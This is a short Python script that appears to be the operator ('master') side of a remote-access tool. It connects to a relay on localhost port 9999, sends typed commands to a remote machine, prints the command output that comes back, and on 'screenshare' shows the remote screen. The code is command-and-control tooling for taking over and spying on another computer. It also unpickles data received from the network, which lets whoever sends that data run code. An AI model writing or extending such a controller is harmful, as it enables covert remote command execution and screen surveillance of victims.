import socket
import pickle
import struct
import cv2

bridge = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
bridge.connect(('localhost',9999))
bridge.send(b"master")

def receive(cli):
    data = b""
    payload_size = struct.calcsize('>L')
    while len(data) < payload_size:
        received = cli.recv(4096) 
        data += received
    packed_msg_size = data[:payload_size]
    data = data[payload_size:]
    msg_size = struct.unpack('>L',packed_msg_size)[0]
    while len(data) < msg_size:
        data += cli.recv(4096)

    frame_data = data[:msg_size]

    #data = data[msg_size:]

    return pickle.loads(frame_data,fix_imports=True,encoding="bytes")


def send(data,cli):
    data = pickle.dumps(data,0)
    size = len(data)
    cli.sendall(struct.pack('>L',size)+data)

while True:
    command = input("cmd>")
    send(command,bridge)
    
    if command == "screenshare":
        cv2.imshow("screen",cv2.imdecode(receive(bridge),cv2.IMREAD_COLOR))
        if cv2.waitKey(1) == ord('q'):
            bridge.close()
            break
    else: #cmd
        print(receive(bridge))